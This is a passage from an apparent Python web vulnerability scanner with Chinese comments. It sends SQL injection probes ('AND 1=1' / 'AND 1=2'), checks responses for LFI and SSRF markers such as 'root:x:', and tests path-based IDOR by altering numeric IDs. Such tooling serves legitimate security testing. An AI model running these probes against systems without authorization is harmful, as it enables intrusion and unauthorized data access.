                            evidence = self._detect_ssrf(resp, actual_payload)
                            if not evidence and any(
                                marker in resp.get("body", "")
                                for marker in ("root:x:", "daemon:", "[extensions]",
                                              "[fonts]", "DOCUMENT_ROOT")):
                                evidence = f"LFI命中: {actual_payload[:40]} → 含文件内容标志"
                        elif vuln_type == "redirect":
                            evidence = self._detect_redirect(resp, actual_payload)
                            if evidence:
                                confidence = "confirmed"
                        elif vuln_type == "idor-path":
                            # 路径型 IDOR 已在外层 scan_path_idor 处理, 跳过
                            evidence = None

                        if evidence:
                            findings.append(InjectionFinding(
                                channel=channel, param=param, vuln_type=vuln_type,
                                payload=actual_payload, evidence=evidence,
                                confidence=confidence,
                                request_url=resp.get("url", url),
                                response_snippet=resp.get("body", "")[:200],
                            ))

                        # TrafficJournal: 记录每次请求
                        if self.journal:
                            _record_to_journal(
                                self.journal, url, channel, param, actual_payload,
                                resp, vuln_type, evidence, confidence,
                            )

                        time.sleep(self.delay)  # 礼貌延迟

                        # 发现 confirmed 后不再对同参数+同类型重复打 (避免噪音)
                        if evidence and confidence == "confirmed":
                            break
                    if any(f.confidence == "confirmed" and f.param == param
                           and f.vuln_type == vuln_type for f in findings):
                        break

                # Boolean-based SQLi 探测 (在常规 payload 之后)
                # 只对数字型参数做 (groupid=123 这种), 且该参数尚未确认 sqli
                if (vuln_type == "sqli" and channel == "GET"
                        and original_value.isdigit()
                        and not any(f.confidence == "confirmed" and f.param == param
                                    and f.channel == channel for f in findings)):
                    bool_finding = self._boolean_probe(
                        url, param, original_value, base_get_params, base_cookies)
                    if bool_finding:
                        findings.append(bool_finding)
                        report.total_requests += 2  # TRUE + FALSE 两个请求

        report.findings = findings
        return report

    def _boolean_probe(self, url: str, param: str, original_value: str,
                       base_params: dict, base_cookies: dict) -> Optional[InjectionFinding]:
        """
        Boolean-based SQLi 精准探测.

        发两个请求:
            TRUE:  {param}={original_value} AND 1=1
            FALSE: {param}={original_value} AND 1=2
        对比响应 → 如果 TRUE≈基线, FALSE≠基线 → SQLi 确认.
        """
        true_payload = f"{original_value} AND 1=1"
        false_payload = f"{original_value} AND 1=2"

        resp_true = self._send_payload(url, "GET", param, true_payload,
                                        base_params=base_params,
                                        base_cookies=base_cookies)
        time.sleep(self.delay)
        resp_false = self._send_payload(url, "GET", param, false_payload,
                                         base_params=base_params,
                                         base_cookies=base_cookies)
        time.sleep(self.delay)

        if resp_true is None or resp_false is None:
            return None
        if resp_true.get("error") or resp_false.get("error"):
            return None

        evidence = self._detect_sqli_boolean(resp_true, resp_false, param)
        if evidence:
            return InjectionFinding(
                channel="GET", param=param, vuln_type="sqli",
                payload=f"{true_payload} / {false_payload}",
                evidence=evidence, confidence="confirmed",
                request_url=resp_true.get("url", url),
                response_snippet=f"TRUE:{resp_true.get('length',0)}b "
                                 f"FALSE:{resp_false.get('length',0)}b "
                                 f"BASE:{self._baseline_length}b",
            )
        return None


# ============================================================
# TrafficJournal 辅助
# ============================================================

def _record_to_journal(journal, url, channel, param, payload,
                       resp, vuln_type, evidence, confidence):
    """把 injector 的请求记录到 TrafficJournal."""
    try:
        if evidence:
            severity = "high" if confidence == "confirmed" else "medium"
            journal.record_finding(
                vuln_type=vuln_type,
                target=f"{url} ({channel}/{param}={payload[:30] if payload else ''})",
                evidence=evidence[:100],
                severity=severity,
                source="injector",
            )
        else:
            summary = (f"INJECT {url} ({channel}/{param}={payload[:30] if payload else ''}) "
                       f"→ {resp.get('status',0)} {resp.get('length',0)}b")
            status = resp.get('status', 0)
            tags = [f"inject-{vuln_type}"]
            if status in (403, 429, 503):
                tags.append("blocked")
            journal.record_raw(
                protocol="http", target=url,
                summary=summary, tags=tags,
                source="injector", status=status,
                error=resp.get("error", ""),
            )
    except Exception:
        pass  # journal 失败不影响注入测试


# ============================================================
# 路径型 IDOR 扫描 (新建)
# ============================================================

import re as _re_idor_path
from urllib.parse import urlparse as _urlparse_idor_path, urlunparse as _urlunparse_idor_path


def scan_path_idor(session, url: str, mode_values: List[str] = None,
                   timeout: float = 8.0) -> List[InjectionFinding]:
    """
    路径型 IDOR 扫描 (针对 /catalog/product/{id} 这种结构).

    Args:
        session: 已配代理的 requests.Session
        url: 形如 http://target/catalog/product/123
        mode_values: 要尝试的 ID 值, 默认 [id-1, id+1, 0, -1, 9999]

    Returns:
        [InjectionFinding(vuln_type="idor", ...)]
    """
    if mode_values is None:
        mode_values = ["__DEC__", "__INC__", "0", "-1", "9999", "__ORIG__"]

    findings = []
    m = _re_idor_path.search(r'(.*?)(\d+)(/?)$', url.rstrip('/'))
    if not m:
        return findings
    prefix, orig_id, suffix = m.group(1), m.group(2), m.group(3)
    orig_id_int = int(orig_id)

    parsed = _urlparse_idor_path(url)

    # 基线
    try:
        baseline = session.get(url, timeout=timeout, allow_redirects=True)
        baseline_status = baseline.status_code
        baseline_length = len(baseline.text)
    except Exception:
        return findings

    candidates = []
    for v in mode_values:
        if v == "__DEC__":
            new_id = max(0, orig_id_int - 1)
            candidates.append(str(new_id))
        elif v == "__INC__":
            candidates.append(str(orig_id_int + 1))
        elif v == "__ORIG__":
            candidates.append(orig_id)
        else:
            candidates.append(v)

    for new_id in candidates:
        new_path = f"{prefix}{new_id}{suffix}"
        new_url = _urlunparse_idor_path(parsed._replace(path=new_path))
        try:
            r = session.get(new_url, timeout=timeout, allow_redirects=True)
            status = r.status_code
            length = len(r.text)
            evidence = None
            confidence = "probable"
            # 1. 基线拒绝 → 改值后通过
            if baseline_status in (401, 403) and status == 200:
                evidence = f"路径IDOR: {baseline_status}→200 ({orig_id}→{new_id})"
                confidence = "confirmed"
            # 2. 基线 404 → 改值后 200
            elif baseline_status == 404 and status == 200:
                evidence = f"路径IDOR绕过: 404→200 ({orig_id}→{new_id})"
                confidence = "confirmed"
            # 3. 基线 200, 改值后仍 200 但长度差异大
            elif (baseline_status == 200 and status == 200
                  and abs(length - baseline_length) > 200 and length > 100):
                evidence = (f"路径IDOR可能: 响应长度 {baseline_length}→{length} "
                            f"({orig_id}→{new_id})")
            # 4. 基线 200 (即使同一长度), 改值后 0 = 路径存在但 ID 命中边界
            elif (baseline_status == 200 and status == 200
                  and length > 100 and new_id in ("0", "-1")):
                # 仅当基线长度非常小 (<500, 可能是空白页) 且改值后显著增大时记
                # 这是 _ORIG__=基线, 0 = 边界访问的特征
                if abs(length - baseline_length) > 100:
                    evidence = (f"路径IDOR边界: 响应长度 {baseline_length}→{length} "
                                f"({orig_id}→{new_id})")
            if evidence:
                findings.append(InjectionFinding(
                    channel="PATH", param=new_id, vuln_type="idor",
                    payload=new_url, evidence=evidence,
                    confidence=confidence,
                    request_url=new_url,
                    response_snippet=r.text[:200],
                ))
        except Exception:
            continue
    return findings
